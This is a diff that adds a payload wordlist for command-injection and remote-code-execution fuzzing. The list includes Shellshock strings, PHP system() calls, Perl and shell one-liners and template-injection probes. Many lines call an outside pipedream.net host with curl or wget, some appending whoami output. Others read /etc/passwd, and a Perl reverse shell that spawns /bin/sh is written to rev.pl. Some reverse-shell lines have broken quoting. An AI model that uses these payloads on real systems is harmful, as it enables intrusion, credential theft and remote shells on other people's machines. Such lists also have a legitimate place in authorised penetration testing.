@@ -1,0 +1,112 @@
+|| 
+'"
+"'
+&& 
+%0a
+%0a%0d
+%0Acat%20/etc/passwd
+%0a ping -i 30 127.0.0.1 %0a
+%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+() { :;}; /bin/bash -c "curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
+() { :;}; /bin/bash -c "curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/shellshock.txt?vuln=5"
+() { :;}; /bin/bash -c "sleep 15 && curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/shellshock.txt?sleep=1&?vuln=6"
+() { :;}; /bin/bash -c "sleep 35 && curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/shellshock.txt?sleep=3&?vuln=7"
+() { :;}; /bin/bash -c "sleep 65 && curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/shellshock.txt?sleep=6&?vuln=8"
+() { :;}; /bin/bash -c "sleep 65 && curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/shellshock.txt?sleep=9&?vuln=9"
+() { :;}; /bin/bash -c "wget https://eozjs6m7uhg2805.m.pipedream.net/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
+() { :;}; /bin/bash -c "wget https://eozjs6m7uhg2805.m.pipedream.net/.testing/shellshock.txt?vuln=4"
+cat /etc/hosts
+$(`cat /etc/passwd`)
+cat /etc/passwd
+() { :;}; curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/shellshock.txt?vuln=12
+| curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce.txt
+& curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce.txt
+; curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt
+&& curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt
+curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt
+ curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt ||`curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt` #' |curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt||`curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt` #\" |curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt
+curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt ||`curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt` #' |curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt||`curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt` #\" |curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt
+$(`curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt?req=22jjffjbn`)
+;echo%20'<script>alert(1)</script>'
+echo '<img src=https://eozjs6m7uhg2805.m.pipedream.net/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+echo '<script src=https://eozjs6m7uhg2805.m.pipedream.net/.testing/xss.js></script>'// XXXXXXXXXXX
+| echo "use Socket;$i="https://eozjs6m7uhg2805.m.pipedream.net";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+; echo "use Socket;$i="https://eozjs6m7uhg2805.m.pipedream.net";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+& echo "use Socket;$i="https://eozjs6m7uhg2805.m.pipedream.net";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+&& echo "use Socket;$i="https://eozjs6m7uhg2805.m.pipedream.net";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+echo "use Socket;$i="https://eozjs6m7uhg2805.m.pipedream.net";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+() { :;}; echo vulnerable 10
+eval('sleep 15')
+eval('sleep 15');
+eval('whoami')
+eval('whoami');
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+exec('curl https://eozjs6m7uhg2805.m.pipedream.net/exec')
+eval('curl https://eozjs6m7uhg2805.m.pipedream.net/eval')
+\n\033[2curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+\n\033[2wget https://eozjs6m7uhg2805.m.pipedream.net/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+\necho INJECTX\nexit\n\033[2Acurl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt\n
+\necho INJECTX\nexit\n\033[2Asleep 5\n
+\necho INJECTX\nexit\n\033[2Awget https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt\n
+perl -e 'curl https://eozjs6m7uhg2805.m.pipedream.net/perl'
+|| perl -e 'curl https://eozjs6m7uhg2805.m.pipedream.net/perl'
+| perl -e 'curl https://eozjs6m7uhg2805.m.pipedream.net/perl'
+; perl -e 'curl https://eozjs6m7uhg2805.m.pipedream.net/perl'
+& perl -e 'curl https://eozjs6m7uhg2805.m.pipedream.net/perl'
+&& perl -e 'curl https://eozjs6m7uhg2805.m.pipedream.net/perl'
+<?php system("cat /etc/passwd");?>
+<?php system("curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt?req=df2fkjj");?>
+<?php system("echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");?>
+<?php system("sleep 30");?>
+<?php system("wget https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("wget https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt?req=jdfj2jc");?>
+`ping https://eozjs6m7uhg2805.m.pipedream.net/`
+& ping -i 30 https://eozjs6m7uhg2805.m.pipedream.net/ &
+& ping -n 30 https://eozjs6m7uhg2805.m.pipedream.net/ &
+\r
+\r\n
+|| sleep 15
+| sleep 15
+; sleep 15
+& sleep 15 
+&& sleep 15
+ {${sleep(20)}}
+{${sleep(20)}}
+ {${sleep(3)}}
+{${sleep(3)}}
+ {${sleep(hexdec(dechex(20)))}} 
+{${sleep(hexdec(dechex(20)))}} 
+|| system('curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt');
+| system('curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt');
+; system('curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt');
+& system('curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt');
+&& system('curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt');
+system('curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt')
+system('curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt?req=22fd2wdf')
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+|| system('sleep 15');
+| system('sleep 15');
+; system('sleep 15');
+& system('sleep 15');
+&& system('sleep 15');
+system('sleep 15')
+system('sleep 15');
+system('wget https://eozjs6m7uhg2805.m.pipedream.net/system')
+system('wget https://eozjs6m7uhg2805.m.pipedream.net/system');
+() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget https://eozjs6m7uhg2805.m.pipedream.net/.testing/shellshock.txt?vuln=13;curl https://eozjs6m7uhg2805.m.pipedream.net/.testing/shellshock.txt?vuln=15;\");'
+() { :;}; wget https://eozjs6m7uhg2805.m.pipedream.net/.testing/shellshock.txt?vuln=11
+| wget https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce.txt
+& wget https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce.txt
+; wget https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt
+$(`wget https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt`)
+&& wget https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt
+wget https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt
+$(`wget https://eozjs6m7uhg2805.m.pipedream.net/.testing/rce_vuln.txt?req=22jjffjbn`)
+{{4+8}}
+{{person.secret}}
+{{person.name}}
+{1} + {1}
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
